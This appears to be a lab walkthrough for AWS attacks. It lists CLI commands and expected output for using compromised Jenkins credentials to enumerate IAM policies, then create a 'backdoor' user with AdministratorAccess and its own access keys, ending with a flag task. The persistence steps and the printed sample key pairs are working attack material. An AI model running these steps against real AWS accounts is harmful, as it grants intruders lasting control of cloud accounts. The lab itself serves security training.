# Discovering What We Have Access To

Configuring a new profile
>``` shell
>kali@kali:~$ aws configure --profile=CompromisedJenkins  
>
># ========== Expected Result ==========
>AWS Access Key ID [None]: AKIAUBHUBEGIMU2Y5GY7
>AWS Secret Access Key [None]: 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
>Default region name [None]: us-east-1
>Default output format [None]: 
># =====================================
>```

Getting User Name
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
>
># ========== Expected Result ==========
>{
>    "UserId": "AIDAUBHUBEGILTF7TFWME",
>    "Account": "274737132808",
>    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin",
>}
># =====================================
>```

Listing Policies and Group for User
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
>
># ========== Expected Result ==========
>{
>    "PolicyNames": [
>        "jenkins-admin-role"
>    ]
>}
># =====================================
>
>kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
>
># ========== Expected Result ==========
>{
>    "AttachedPolicies": []
>}
># =====================================
>
>kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
>
># ========== Expected Result ==========
>{
>    "Groups": []
>}
># =====================================
>```

Getting Policy
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
>
># ========== Expected Result ==========
>{
>    "UserName": "jenkins-admin",
>    "PolicyName": "jenkins-admin-role",
>    "PolicyDocument": {
>        "Version": "2012-10-17",
>        "Statement": [
>            {
>                "Sid": "",
>                "Effect": "Allow",
>                "Action": "*",
>                "Resource": "*"
>            }
>        ]
>    }
>}
># =====================================
>```

Create User
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor
>
># ========== Expected Result ==========
>{
>    "User": {
>        "Path": "/",
>        "UserName": "backdoor",
>        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
>        "Arn": "arn:aws:iam::274737132808:user/backdoor",
>    }
>}
># =====================================
>```

Attach Admin Policy
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
>```

Get User Credentials
>``` shell
>kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
>
># ========== Expected Result ==========
>{
>    "AccessKey": {
>        "UserName": "backdoor",
>        "AccessKeyId": "AKIAUBHUBEGIDGCLUM53",
>        "Status": "Active",
>        "SecretAccessKey": "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",
>    }
>}
># =====================================
>```

Configure profile and list policies
>``` shell
>kali@kali:~$ aws configure --profile=backdoor    
>
># ========== Expected Result ==========
>AWS Access Key ID [None]: AKIAUBHUBEGIDGCLUM53
>AWS Secret Access Key [None]: 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
>Default region name [None]: us-east-1
>Default output format [None]:  
># =====================================
>
>kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
>
># ========== Expected Result ==========
>{
>    "AttachedPolicies": [
>        {
>            "PolicyName": "AdministratorAccess",
>            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
>        }
>    ]
>}
># =====================================
>```

Lab 1 - Discover the flag in the ec2 instance tag.
>``` shell
>
>```
>
